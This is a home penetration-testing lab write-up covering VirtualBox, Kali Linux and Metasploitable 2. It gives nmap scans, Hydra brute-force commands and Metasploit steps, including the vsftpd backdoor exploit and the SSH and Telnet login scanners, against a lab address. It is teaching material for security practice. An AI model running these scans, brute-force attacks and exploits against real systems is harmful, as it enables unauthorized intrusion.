Home Hacking Lab Project
Description:
This project consisted of setting up a comprehensive home penetration testing lab using VirtualBox. The lab includes virtual machines such as Kali Linux, Metasploitable 2, and DC1 from VulnHub. The primary objective is to practice and enhance cybersecurity skills through hands-on exercises in vulnerability scanning, exploitation, and post-exploitation techniques.

Apps, Languages, & Utilities Used:

Virtualization Software: VirtualBox
Operating Systems: Kali Linux, Metasploitable 2, DC1 VulnHub machine
Security Tools: Metasploit, nmap, Hydra, Wireshark
Scripting: Bash
Environments Used:

Kali Linux: Attacker Machine
Metasploitable 2: Vulnerable Linux VM
DC1 VulnHub Machine: Vulnerable VM
Testing Tools:

Hydra: Used for brute-force attacks
Metasploit: Used for various exploits and vulnerabilities
Wireshark: Used for network traffic analysis
Objective:
The objective of the lab is to provide a hands-on learning experience in setting up a virtualized environment for cybersecurity testing and exploration. By installing and configuring multiple virtual machines (VMs) including Kali Linux, Metasploitable 2, and DC1 from VulnHub, the lab aims to teach skills such as network configuration, vulnerability scanning, service exploitation, and post-exploitation analysis. This lab setup helps in understanding how attackers compromise systems and how to detect and mitigate such attacks.

Skills Learned:

Setting up VMs (Kali Linux, Metasploitable 2, DC1) in Oracle VM VirtualBox.
Configuring IP addresses, NAT Networks for VMs.
Performing vulnerability scanning using nmap.
Exploiting services (FTP, SSH, Telnet) using Metasploit.
Brute-forcing login credentials using Hydra.
Capturing and analyzing network traffic using Wireshark.
Performing privilege escalation and capturing flags on vulnerable machines.
Documenting and reporting exploitation techniques.


Part 1: How To Install VirtualBox On Windows 11
Objective: Install VirtualBox on Windows 11 for creating and managing virtual machines.

Download VirtualBox:

Open a web browser and navigate to the Oracle VirtualBox download page.
Select the Windows installer and download the file.
Install VirtualBox:

Locate the downloaded installer and double-click to start the installation.
Follow the prompts, accepting defaults, and acknowledging any warnings about network interfaces.
Complete the installation but do not start VirtualBox immediately.
Download and Install Extension Pack:

Download the Extension Pack from the same VirtualBox download page.
Install the Extension Pack by double-clicking the downloaded file and following the prompts.
Part 2: How to Install Kali Linux 2022.4 in VirtualBox
Objective: Download and install Kali Linux 2022.4 as a virtual machine in VirtualBox.

Download Kali Linux VM:

Open a web browser and navigate to the Kali Linux download page.
Select the VirtualBox image and download the file.
Extract the Downloaded File:

Extract the contents of the downloaded file to a preferred location on your computer.
Import the Kali Linux VM into VirtualBox:

Open VirtualBox.
Go to File > Import Appliance and select the extracted Kali Linux file.
Follow the prompts to complete the import.
Configure the Kali Linux VM:

Adjust settings such as memory (4GB recommended), processors (2 CPUs), and network adapter (NAT Network).
Verify Network Configuration:

Start the Kali Linux VM and log in.
Open a terminal and run ifconfig to check the IP address.
Ensure the VM has internet connectivity by pinging a website.
Part 3: How to Install PimpMyKali in Kali Linux
Objective: Enhance the Kali Linux setup using the PimpMyKali script to optimize and fix issues.

Download PimpMyKali Script:

Open a web browser and navigate to the PimpMyKali GitHub repository.
Copy the repository URL for cloning.
Clone the Repository:

Open a terminal in Kali Linux and switch to the root user.
Create a directory for tools and clone the repository:
bash
Copy code
sudo su
mkdir /root/tools
cd /root/tools
git clone https://github.com/Dewalt-arch/pimpmykali.git
Run the PimpMyKali Script:

Navigate into the cloned directory and make the script executable:
bash
Copy code
cd pimpmykali
chmod +x pimpmykali.sh
./pimpmykali.sh
Follow the prompts, selecting options such as new VM setup and enabling root login if desired.
Complete the setup and reboot the system.
Part 4: How To Install Metasploitable 2 in VirtualBox
Objective: Install Metasploitable 2, a deliberately vulnerable Linux VM, in VirtualBox.

Download Metasploitable 2:

Open a web browser and navigate to SourceForge.
Download the Metasploitable 2 zip file and extract its contents.
Create a New Virtual Machine in VirtualBox:

Open VirtualBox and create a new VM named MS2 for Metasploitable 2.
Set the type to Linux and version to Other Linux (64-bit).
Use an existing virtual hard disk file and select the extracted Metasploitable 2 VMDK file.
Configure Network Settings:

Adjust the network adapter to NAT Network and select the appropriate network.
Start the Metasploitable 2 VM:

Boot up the VM and log in using the default credentials (msfadmin / msfadmin).
Part 5: How To Hack and Exploit Port 21 FTP on Metasploitable 2
Objective: Exploit the FTP service on Metasploitable 2 to gain unauthorized access.

Scan for Open Ports and Services:

Use nmap to identify open ports and services on Metasploitable 2:
bash
Copy code
nmap -p- -sV -oN ms2.txt 10.0.200.5
Create User and Password Lists:

Create files with potential usernames and passwords:
bash
Copy code
nano users.txt
msfadmin
service
user
guest
nano passwords.txt
msfadmin
service
user
guest
Brute Force FTP Credentials Using Hydra:

Use Hydra to perform a brute force attack on the FTP service:
bash
Copy code
hydra -L users.txt -P passwords.txt ftp://10.0.200.5
Exploit FTP Vulnerability Using Metasploit:

Use Metasploit to exploit the vsftpd 2.3.4 vulnerability:
bash
Copy code
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.0.200.5
exploit
Part 6: How To Hack and Exploit Port 22 SSH on Metasploitable 2
Objective: Exploit the SSH service on Metasploitable 2 to gain unauthorized access.

Discover Metasploitable 2 IP Address:

Identify the IP address using netdiscover:
bash
Copy code
netdiscover -r 10.0.200.0/24
Scan for Open Ports and Services:

Use nmap to scan for SSH service:
bash
Copy code
nmap -p- -sV -oN ms2.txt 10.0.200.5
Create User and Password Lists:

Create files with potential usernames and passwords:
bash
Copy code
nano users.txt
msfadmin
service
user
guest
nano passwords.txt
msfadmin
service
user
guest
Brute Force SSH Credentials Using Metasploit:

Use Metasploit to perform a brute force attack on SSH:
bash
Copy code
msfconsole
search ssh_login
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.0.200.5
set USER_FILE /root/users.txt
set PASS_FILE /root/passwords.txt
set STOP_ON_SUCCESS true
exploit
Verify Access and Interact with the Session:

Interact with the session opened by Metasploit:
bash
Copy code
sessions -i 1
sysinfo
Part 7: How To Hack and Exploit Port 23 Telnet on Metasploitable 2
Objective: Exploit the Telnet service on Metasploitable 2 to capture and analyze network traffic.

Discover Metasploitable 2 IP Address:

Identify the IP address using netdiscover:
bash
Copy code
netdiscover -r 10.0.200.0/24
Scan for Open Ports and Services:

Use nmap to scan for Telnet service:
bash
Copy code
nmap -p- -sV -oN ms2.txt 10.0.200.5
Capture Telnet Traffic Using Wireshark:

Open Wireshark and start capturing traffic on the network interface connected to Metasploitable 2.
Generate Telnet traffic by logging into Metasploitable 2:
bash
Copy code
telnet 10.0.200.5
msfadmin
msfadmin
Stop the capture and analyze the traffic to find cleartext credentials.
Exploit Telnet Using Metasploit:

Use Metasploit to exploit the Telnet service:
bash
Copy code
msfconsole
search telnet_login
use auxiliary/scanner/telnet/telnet_login
set RHOSTS 10.0.200.5
set USERNAME msfadmin
set PASSWORD msfadmin
exploit
Verify Access and Interact with the Session:

Interact with the session opened by Metasploit:
bash
Copy code
sessions -i 1
sysinfo
